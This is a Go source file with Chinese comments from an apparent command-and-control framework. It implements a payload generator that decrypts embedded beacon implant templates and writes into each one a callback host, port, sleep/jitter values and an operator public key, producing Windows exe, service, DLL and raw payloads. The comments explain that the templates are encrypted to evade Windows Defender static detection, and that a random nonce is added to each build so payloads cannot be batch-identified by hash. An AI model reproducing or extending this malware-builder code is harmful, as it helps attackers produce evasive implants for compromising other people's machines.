package main

// csdev :: gen_native.go  --  内置载荷生成器 (零外部工具链)
//
// 背景: 原先生成载荷要调 tools/gen_payload2.ps1, 而那个脚本内部再调 gcc ——
// 于是生成端必须同时具备 PowerShell 与 MinGW。把服务端部署到 Linux 之后,
// 这条路径直接断开 ("executable file not found in $PATH")。
//
// 做法: **把编译挪到项目构建期**。
//   tools/build_templates.ps1 预先编出各格式的"模板", 模板里留有一段固定布局的
//   运行时配置槽 (见 kits/beacon/beacon2.c 的 C2_RUNTIME_CFG); 本文件把模板
//   go:embed 进服务端, 生成时只把配置按偏移写进模板副本。
//
// 于是生成端**不需要任何工具链** —— 纯字节操作, 在 Windows / Linux / macOS 上一样跑。
//
// 代价与边界:
//   - 模板是构建期产物, 改了植入体 C 代码必须重跑 build_templates.ps1 并一起提交;
//   - 只覆盖"结构性相同、仅参数不同"的格式。子系统/入口不同的格式各有一份模板。
//   - 脚本类格式 (ps1/vba/vbs/cs/hta) 目前仍走 ps1 生成器, 见 SupportsNative 的说明。

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"embed"
	"encoding/binary"
	"errors"
	"fmt"
	"strings"
)

// 模板以**加密形式**入库, 生成时在内存里还原。
//
// 为什么必须加密: 服务端要能零工具链地生成载荷, 就必须把编译好的载荷模板带在自己
// 里面。而带明文的 C2 载荷会让**服务端二进制本身**被杀软静态查杀 ——
// 实测 Windows Defender 直接拦截构建 (Go 把产物写到临时路径的瞬间就被隔离)。
//
// 密钥与模板同目录存放。密钥能被逆出来, 但这不影响目的: 要挡的是**静态特征扫描**,
// 不是逆向分析。扫描器做的是字节特征匹配, 加密后的字节不匹配任何已知特征。
var (
	//go:embed templates/key.bin
	templateKeyBlob []byte

	//go:embed templates/*.bin
	templateFS embed.FS
)

// cfgMagic 必须与 kits/beacon/beacon2.c 里 g_c2cfg.magic 的 8 个字节逐字节一致。
// 用非打印的高熵字节而不是可读字符串, 是为了让"全文件恰好命中一次"这个校验有意义 ——
// 可读串容易和代码里的常量撞上。
var cfgMagic = [8]byte{0x52, 0x47, 0x43, 0x32, 0xA5, 0x5A, 0xC3, 0x3C}

const (
	// 加密文件的头部长度: 16 字节随机 IV 之后接 AES-256-CBC(PKCS7) 密文
	tmplIVLen = 16
	// 模板密钥长度 (AES-256)
	tmplKeyLen = 32
)

// loadTemplate 读取并解密模板。
//
// 用 CBC 而不是 CTR/CFB: .NET 的 CFB 是 CFB8, 与 Go 的 CFB128 不兼容,
// 两侧盲写必然对不上; CBC + PKCS7 在两边的语义完全一致, 没有歧义。
func loadTemplate(name string) ([]byte, error) {
	raw, err := templateFS.ReadFile(name)
	if err != nil {
		return nil, fmt.Errorf("读取模板 %s 失败: %v", name, err)
	}
	return decryptTemplate(raw)
}

func decryptTemplate(raw []byte) ([]byte, error) {
	if len(templateKeyBlob) != tmplKeyLen {
		return nil, fmt.Errorf("模板密钥长度异常: %d (应为 %d), 检查 templates/key.bin",
			len(templateKeyBlob), tmplKeyLen)
	}
	if len(raw) < tmplIVLen+16 || (len(raw)-tmplIVLen)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("模板密文长度非法: %d", len(raw))
	}

	block, err := aes.NewCipher(templateKeyBlob)
	if err != nil {
		return nil, err
	}
	pt := make([]byte, len(raw)-tmplIVLen)
	cipher.NewCBCDecrypter(block, raw[:tmplIVLen]).CryptBlocks(pt, raw[tmplIVLen:])

	// 去掉 PKCS7 填充。校验要严: 填充值非法说明密钥不对或文件损坏,
	// 此时**必须报错**而不是勉强返回 —— 返回半截模板会产出无法运行的载荷。
	n := int(pt[len(pt)-1])
	if n < 1 || n > aes.BlockSize || n > len(pt) {
		return nil, errors.New("模板解密失败 (填充非法): 密钥不匹配或文件损坏")
	}
	for _, b := range pt[len(pt)-n:] {
		if int(b) != n {
			return nil, errors.New("模板解密失败 (填充字节不一致): 密钥不匹配或文件损坏")
		}
	}
	return pt[:len(pt)-n], nil
}

// 配置槽布局。**必须与 C2_RUNTIME_CFG 逐字段对应**, 改字段要同时改两处并递增版本。
const (
	cfgSlotSize = 1024

	offMagic     = 0
	offVersion   = 8
	offPort      = 12
	offSleep     = 16
	offJitter    = 20
	offFlags     = 24
	offNonce     = 28
	offHost      = 32
	offURI       = 160
	offXform     = 224
	offTokenSalt = 256
	offTokenHash = 280
	offIDHeader  = 352
	offIDValue   = 400
	offPubkey    = 480
	offReserved  = 756

	lenHost      = 128
	lenURI       = 64
	lenXform     = 32
	lenTokenSalt = 24
	lenTokenHash = 72
	lenIDHeader  = 48
	lenIDValue   = 80
	lenPubkey    = 276
	lenReserved  = 268

	cfgVersion = 2

	flagSSL = 1 << 0
)

// PayloadCfg 是一次生成请求的配置。字段语义与 GUI「载荷生成」页一一对应。
type PayloadCfg struct {
	Host      string
	Port      int
	URI       string
	Sleep     int
	Jitter    int
	Xform     string
	SSL       bool
	TokenSalt string // 16 位十六进制; 空 = 不启用启动口令门控
	TokenHash string // 64 位十六进制
	IDHeader  string
	IDValue   string
	Pubkey    []byte // CryptoAPI PUBLICKEYBLOB(276B); 空 = 保留模板编译期公钥
}

// templateOf 把格式 ID 映射到模板文件。返回空串表示该格式没有原生支持。
//
// 只有**结构性不同**的格式才需要独立模板。纯参数差异 (地址/端口/URI/sleep/口令)
// 全部由运行时配置槽承载, 共用同一个模板 —— 这正是这套机制的价值所在。
func templateOf(format string) string {
	switch format {
	case "win2-exe":
		return "templates/win2-exe.bin"
	case "win2-console":
		return "templates/win2-console.bin"
	case "win2-svc":
		return "templates/win2-svc.bin"
	case "win2-dll":
		return "templates/win2-dll.bin"
	case "win2-raw":
		return "templates/win2-raw.bin"
	case "win2-tcp":
		return "templates/win2-tcp.bin"
	}
	return ""
}

// SupportsNative 报告某格式能否用内置生成器产出。
//
// 脚本类格式 (win2-ps1 / win2-vba / win2-vbs / win2-cs / win2-hta) 与协议 v1 的
// 全部格式暂不在此列 —— 它们要么需要把 shellcode 编进脚本文本 (模板尚未抽取),
// 要么走的是 v1 的旧链路。这些格式在 Windows 开发机上仍可用 ps1 生成器产出。
func SupportsNative(format string) bool {
	return templateOf(format) != ""
}

// NativeFormats 列出内置生成器支持的格式, 供 GUI 与文档使用。
func NativeFormats() []string {
	return []string{"win2-exe", "win2-console", "win2-svc", "win2-dll", "win2-raw", "win2-tcp"}
}

// findSlot 在模板里定位配置槽。
//
// 要求**全文件恰好命中一次**: 命中 0 次说明模板没带槽位 (编译参数不对),
// 命中多次说明定位标记和代码里的字节撞了 —— 两种都必须报错而不是随便挑一个,
// 否则会生成出配置写错位置的载荷, 那种问题在目标机上极难排查。
func findSlot(b []byte) (int, error) {
	found := -1
	for i := 0; i+len(cfgMagic) <= len(b); i++ {
		hit := true
		for j := 0; j < len(cfgMagic); j++ {
			if b[i+j] != cfgMagic[j] {
				hit = false
				break
			}
		}
		if !hit {
			continue
		}
		if found >= 0 {
			return 0, fmt.Errorf("配置槽定位标记出现多次 (偏移 0x%X 与 0x%X), 拒绝生成", found, i)
		}
		found = i
	}
	if found < 0 {
		return 0, errors.New("模板里找不到配置槽定位标记 (模板可能不是由 tools/build_templates.ps1 生成的)")
	}
	if found+cfgSlotSize > len(b) {
		return 0, fmt.Errorf("配置槽超出文件尾 (偏移 0x%X + %d > 长度 %d)", found, cfgSlotSize, len(b))
	}
	return found, nil
}

// putStr 把字符串按定长 NUL 结尾写入 buf 的 off 处。
// 超长直接报错而不是截断 —— 截断出来的地址或路径会静默错误, 比生成失败更难查。
func putStr(buf []byte, off, size int, field, val string) error {
	if len(val) > size-1 {
		return fmt.Errorf("字段 %s 过长: %d 字节, 上限 %d", field, len(val), size-1)
	}
	dst := buf[off : off+size]
	for i := range dst {
		dst[i] = 0
	}
	copy(dst, val)
	return nil
}

func hostPortSafe(s string) bool {
	// 只做最基本的可用性检查: 非空、无 NUL、无空白
	if s == "" || len(s) > 100 {
		return false
	}
	if strings.ContainsAny(s, "\x00 \t\r\n") {
		return false
	}
	return true
}

// PatchConfig 把配置写进模板副本并返回完整产物。**不修改入参**。
func PatchConfig(tmpl []byte, cfg PayloadCfg) ([]byte, error) {
	if !hostPortSafe(cfg.Host) {
		return nil, fmt.Errorf("回连地址不合法: %q", cfg.Host)
	}
	if cfg.Port <= 0 || cfg.Port > 65535 {
		return nil, fmt.Errorf("端口超出范围: %d", cfg.Port)
	}
	if cfg.Sleep < 50 {
		cfg.Sleep = 50
	}
	if cfg.Sleep > 3600000 {
		cfg.Sleep = 3600000
	}
	if cfg.Jitter < 0 {
		cfg.Jitter = 0
	}
	if cfg.Jitter > 90 {
		cfg.Jitter = 90
	}
	if cfg.URI == "" {
		cfg.URI = "/submit"
	}
	if cfg.Xform == "" {
		cfg.Xform = "raw"
	}
	// 口令门控: 要么两个都给, 要么都不给 —— 只给一个是生成端的逻辑错误
	if (cfg.TokenSalt == "") != (cfg.TokenHash == "") {
		return nil, errors.New("启动口令的盐与摘要必须同时提供")
	}

	slot, err := findSlot(tmpl)
	if err != nil {
		return nil, err
	}

	out := make([]byte, len(tmpl))
	copy(out, tmpl)

	binary.LittleEndian.PutUint32(out[slot+offVersion:], cfgVersion)
	binary.LittleEndian.PutUint32(out[slot+offPort:], uint32(cfg.Port))
	binary.LittleEndian.PutUint32(out[slot+offSleep:], uint32(cfg.Sleep))
	binary.LittleEndian.PutUint32(out[slot+offJitter:], uint32(cfg.Jitter))

	var flags uint32
	if cfg.SSL {
		flags |= flagSSL
	}
	binary.LittleEndian.PutUint32(out[slot+offFlags:], flags)

	// 每次生成写一个随机 nonce: 让不同载荷的这段字节互不相同。
	// 否则同样的配置会生成**逐字节相同**的产物 —— 哈希完全相同, 一眼就能批量识别。
	var nb [4]byte
	if _, err := rand.Read(nb[:]); err != nil {
		return nil, fmt.Errorf("随机数不可用: %v", err)
	}
	copy(out[slot+offNonce:], nb[:])

	fields := []struct {
		off, size int
		name, val string
	}{
		{offHost, lenHost, "回连地址", cfg.Host},
		{offURI, lenURI, "URI", cfg.URI},
		{offXform, lenXform, "变换链", cfg.Xform},
		{offTokenSalt, lenTokenSalt, "口令盐", cfg.TokenSalt},
		{offTokenHash, lenTokenHash, "口令摘要", cfg.TokenHash},
		{offIDHeader, lenIDHeader, "metadata 头", cfg.IDHeader},
		{offIDValue, lenIDValue, "metadata 值", cfg.IDValue},
	}
	for _, f := range fields {
		if err := putStr(out, slot+f.off, f.size, f.name, f.val); err != nil {
			return nil, err
		}
	}

	// 运行期公钥: 把服务端当前公钥写进槽位, 让载荷与服务端私钥永远同源。
	// 空 pubkey (旧调用方 / 手工 gcc 模板) 保留模板编译期公钥, 行为向后兼容。
	if len(cfg.Pubkey) > 0 {
		if len(cfg.Pubkey) > lenPubkey {
			return nil, fmt.Errorf("公钥 blob 过长: %d 字节, 上限 %d", len(cfg.Pubkey), lenPubkey)
		}
		dst := out[slot+offPubkey : slot+offPubkey+lenPubkey]
		for i := range dst {
			dst[i] = 0
		}
		copy(dst, cfg.Pubkey)
	}

	for i := slot + offReserved; i < slot+cfgSlotSize; i++ {
		out[i] = 0
	}

	return out, nil
}

// BuildPayloadNative 读模板 + 写配置, 产出最终载荷。
func BuildPayloadNative(format string, cfg PayloadCfg) ([]byte, error) {
	name := templateOf(format)
	if name == "" {
		return nil, fmt.Errorf("格式 %s 没有内置模板", format)
	}
	tmpl, err := loadTemplate(name)
	if err != nil {
		return nil, err
	}
	return PatchConfig(tmpl, cfg)
}
